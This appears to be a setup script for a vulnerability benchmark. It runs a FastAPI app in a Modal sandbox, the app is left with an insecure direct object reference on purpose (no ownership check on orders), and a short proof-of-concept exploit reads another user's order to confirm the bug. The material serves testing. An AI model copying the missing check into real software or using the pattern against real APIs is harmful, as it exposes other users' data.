import modal
import time

app = modal.App.lookup("vulnbench", create_if_missing=True)

image = (
    modal.Image.debian_slim()
    .pip_install("fastapi", "uvicorn", "requests")
)

# ───────────────────────────────────────────────────────
# 1. The vulnerable FastAPI app (IDOR — no ownership check)
# ───────────────────────────────────────────────────────
VULN_APP = """
from fastapi import FastAPI, Header

app = FastAPI()

USERS = {
    1: {"name": "alice", "secret": "alice-token"},
    2: {"name": "bob",   "secret": "bob-token"},
}
ORDERS = {
    101: {"user_id": 1, "item": "alice-book"},
    201: {"user_id": 2, "item": "bob-laptop"},
}

def get_uid(token):
    for uid, u in USERS.items():
        if u["secret"] == token:
            return uid
    return None

@app.get("/orders/{order_id}")
def get_order(order_id: int, authorization: str = Header(...)):
    token = authorization.replace("Bearer ", "")
    uid = get_uid(token)
    if uid is None:
        return {"error": "unauth"}
    # BUG: doesn't check that the order belongs to uid
    if order_id in ORDERS:
        return ORDERS[order_id]
    return {"error": "not found"}
"""

# ───────────────────────────────────────────────────────
# 2. The exploit — Alice tries to read Bob's order
# ───────────────────────────────────────────────────────
EXPLOIT = """
import requests, sys

r = requests.get(
    "http://127.0.0.1:8000/orders/201",
    headers={"Authorization": "Bearer alice-token"}
)
data = r.json()
print("Server returned:", data)

# If alice saw bob's item, the IDOR triggered
if data.get("item") == "bob-laptop":
    print("PWNED")
    sys.exit(0)
else:
    print("safe")
    sys.exit(1)
"""

# ───────────────────────────────────────────────────────
# 3. Spin up sandbox and run the loop
# ───────────────────────────────────────────────────────
print("Creating sandbox...")
sb = modal.Sandbox.create(app=app, image=image, timeout=120)

print("Writing vulnerable app...")
sb.filesystem.write_text(VULN_APP, "/root/app.py")

print("Writing exploit script...")
sb.filesystem.write_text(EXPLOIT, "/root/exploit.py")

print("Starting web server...")
server = sb.exec(
    "uvicorn", "app:app",
    "--host", "127.0.0.1", "--port", "8000",
    workdir="/root",
)

print("Waiting 5 seconds for boot...")
time.sleep(15)

print("Running exploit inside sandbox...")
result = sb.exec("python", "/root/exploit.py")
result.wait()

stdout = result.stdout.read()
print("--- exploit output ---")
print(stdout)
print("--- end output ---")
print("EXIT CODE:", result.returncode)

if "PWNED" in stdout:
    print("\n✓ VERIFIED: the app has a real, exploitable IDOR.")
else:
    print("\n✗ Not exploited (something went wrong).")

sb.terminate()
print("Done.")
